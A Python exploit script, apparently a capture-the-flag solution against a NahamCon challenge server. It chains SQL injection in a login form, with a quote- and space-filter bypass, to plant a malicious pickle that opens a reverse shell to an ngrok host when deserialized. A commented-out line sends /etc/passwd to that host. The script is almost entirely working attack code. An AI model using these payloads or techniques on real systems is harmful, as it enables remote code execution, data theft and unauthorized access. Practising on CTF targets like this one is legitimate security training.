import requests
import uuid
from datetime import datetime, timedelta
import pickle
import base64
import os
import random
import string

def generate_random_string(length):
	characters = string.ascii_letters
	return ''.join(random.choice(characters) for _ in range(length))

class RCE:
	def __reduce__(self):
		# first request I tried 
		# cmd = ("python3 -c \"import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));s.send(open('/etc/passwd','rb').read())\"")
		cmd = ("python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('4.tcp.eu.ngrok.io',18312));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"")
		return os.system, (cmd,)

command = base64.b64encode(pickle.dumps(RCE())).decode('utf-8')

print(command)

def DBClean(string):
	for bad_char in " '\"":
		string = string.replace(bad_char,"")
	return string.replace("\\", "'")

password = "pass"
session_id = str(uuid.uuid4())
# session_id = "e1f08f54-5d63-4199-a3d8-7083597647dc"
session = f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')"

filename = generate_random_string(5)
print(filename)

add = f"INSERT OR IGNORE INTO files VALUES ('" + filename + "', '" + command + "', NULL)"

input = "admin';" + session + ";" + add + ";--"

password = input.replace(" ", "/**/").replace("'","\\")
print(password)
user = 'admin'

sql = f"SELECT * FROM users WHERE username='{DBClean(user)}' AND password='{DBClean(password)}'"
print('\n=================================================================\n')
print(sql)

url = 'http://challenge.nahamcon.com:30939/login'
data = {
	'username': 'adminnnn',
	'password': password
}

response = requests.post(url, data=data)
if response.status_code == 200:
	print('Login successful!')
	print(response.text)


	print("\n\n++++++++++++++++++++++++++++++++++++++++\n\n")
	url = 'http://challenge.nahamcon.com:30939/download/' + filename +'/' + session_id
	response = requests.get(url)
	if response.status_code == 200:
		print('Download successful!')
		content = response.content
		print("content")
		print(content)
	else:
		# Request failed
		print('Download failed. Status code:', response.text)



else:
	print('Login failed. Status code:', response.status_code)